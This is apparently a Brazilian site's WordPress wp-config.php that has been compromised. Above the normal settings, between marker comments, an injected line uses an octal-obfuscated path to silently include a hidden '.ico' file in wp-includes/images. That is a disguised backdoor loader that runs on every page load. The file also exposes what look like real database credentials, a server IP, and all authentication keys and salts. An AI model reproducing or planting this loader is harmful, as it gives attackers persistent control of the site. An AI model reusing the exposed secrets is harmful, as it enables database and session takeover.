<?php
/*a5b3a*/

@include "\057h\157m\145/\163t\157r\141g\145/\061/\0637\0574\064/\145s\164r\145l\141d\145b\162a\163i\154i\141/\160u\142l\151c\137h\164m\154/\156o\166o\057w\160-\151n\143l\165d\145s\057i\155a\147e\163/\0564\0711\1419\1442\060.\151c\157";

/*a5b3a*/
/**
 * As configurações básicas do WordPress
 *
 * O script de criação wp-config.php usa esse arquivo durante a instalação.
 * Você não precisa usar o site, você pode copiar este arquivo
 * para "wp-config.php" e preencher os valores.
 *
 * Este arquivo contém as seguintes configurações:
 *
 * * Configurações do MySQL
 * * Chaves secretas
 * * Prefixo do banco de dados
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/pt-br:Editando_wp-config.php
 *
 * @package WordPress
 */

// ** Configurações do MySQL - Você pode pegar estas informações com o serviço de hospedagem ** //
/** O nome do banco de dados do WordPress */
define( 'DB_NAME', 'estrelabrasi7' );

/** Usuário do banco de dados MySQL */
define( 'DB_USER', 'estrelabrasi7' );

/** Senha do banco de dados MySQL */
define( 'DB_PASSWORD', 'Atilio#123' );

/** Nome do host do MySQL */
define( 'DB_HOST', '186.202.152.67' );

/** Charset do banco de dados a ser usado na criação das tabelas. */
define( 'DB_CHARSET', 'utf8mb4' );

/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */
define('DB_COLLATE', '');

define('WP_MEMORY_LIMIT', '256M');

/**#@+
 * Chaves únicas de autenticação e salts.
 *
 * Altere cada chave para um frase única!
 * Você pode gerá-las
 * usando o {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org
 * secret-key service}
 * Você pode alterá-las a qualquer momento para invalidar quaisquer
 * cookies existentes. Isto irá forçar todos os
 * usuários a fazerem login novamente.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'nKqGW60Km.To@YU^eMM=cN~IRq,lsHj-t>p!l}3Pn}y~9{0fodFC|]EYi#YDA5z@' );
define( 'SECURE_AUTH_KEY',  'ji!EtS;+=&|G}evp(&j]2FWLUjg}6O*<uMlXX;XQ-WE3Aq<7Qp;r  sk4DU<6-Dr' );
define( 'LOGGED_IN_KEY',    '|6^XD|J9O4$S91X0zNSaNTU9((}lmE;v9!<U`Y_=7$pxvOG^w=t^!@toWdRG_1}z' );
define( 'NONCE_KEY',        'KrfvMbY0|kMe/Ji*_DR/Q&Af(WWZCqBNpTfw.YswLd~)e|Iqk.4@M)IZF{h3>J!c' );
define( 'AUTH_SALT',        'GEGhiyx?&:DGba},vtVVb[$I14)A>]I:#+i1|it*%ou[ Zc4e?4}U)t2[z_}wnz,' );
define( 'SECURE_AUTH_SALT', 'B~kC!Bu?6$!AXObDyY;.!4AObinE.eeT(f1P|eGicdY=;qt[`Ntz;)B%>lVt4TCf' );
define( 'LOGGED_IN_SALT',   '008;Y]i)j6TIJCW(i:45Dr$QRZ&;sk7[fL>lRs+`i,%sg}?HJ^+XYdP35%~1pwXc' );
define( 'NONCE_SALT',       '0(1Otq882^fZkUD))Ey+$4u`+iMAe,@gMoQHAcgbhuY#2Ao%A4+YB}h[g2Q7Mi9c' );

/**#@-*/

/**
 * Prefixo da tabela do banco de dados do WordPress.
 *
 * Você pode ter várias instalações em um único banco de dados se você der
 * um prefixo único para cada um. Somente números, letras e sublinhados!
 */
$table_prefix = 'wp_';

/**
 * Para desenvolvedores: Modo de debug do WordPress.
 *
 * Altere isto para true para ativar a exibição de avisos
 * durante o desenvolvimento. É altamente recomendável que os
 * desenvolvedores de plugins e temas usem o WP_DEBUG
 * em seus ambientes de desenvolvimento.
 *
 * Para informações sobre outras constantes que podem ser utilizadas
 * para depuração, visite o Codex.
 *
 * @link https://codex.wordpress.org/pt-br:Depura%C3%A7%C3%A3o_no_WordPress
 */
define('WP_DEBUG', false);
define('FORCE_SSL_ADMIN', false);

/* Isto é tudo, pode parar de editar! :) */

/** Caminho absoluto para o diretório WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Configura as variáveis e arquivos do WordPress. */
require_once(ABSPATH . 'wp-settings.php');
